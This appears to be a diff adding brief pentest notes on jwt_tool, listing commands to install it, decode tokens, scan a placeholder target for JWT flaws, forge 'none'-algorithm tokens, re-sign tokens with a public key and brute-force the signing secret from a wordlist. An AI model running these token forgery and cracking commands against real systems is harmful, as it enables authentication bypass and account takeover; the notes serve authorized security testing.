@@ -1,0 +1,25 @@
+* Install:<br>
+	$ git clone https://github.com/ticarpi/jwt_tool<br>
+	$ python3 -m pip install termcolor cprint pycryptodomex requests<br>
+
+* Decode / display jwt tocken info
+
+	jwt_tool <token>
+
+
+* Playbook scan for known vulnerabilities
+
+	jwt_tool -t http://target-site.com/ -rc "Header: JWT_Token" -M pb
+
+* Generate a bunch of tokens with hash algo set to none
+
+	jwt_tool <token> -X a
+
+
+* Encode using key public-key-pem
+
+	jwt_tool <token> -x k-pk public-key-pem
+
+* Brute-force secret key (used to sign tokens) based on the dictionary
+
+	jwt_tool <token> -C -d /wordlist.txt
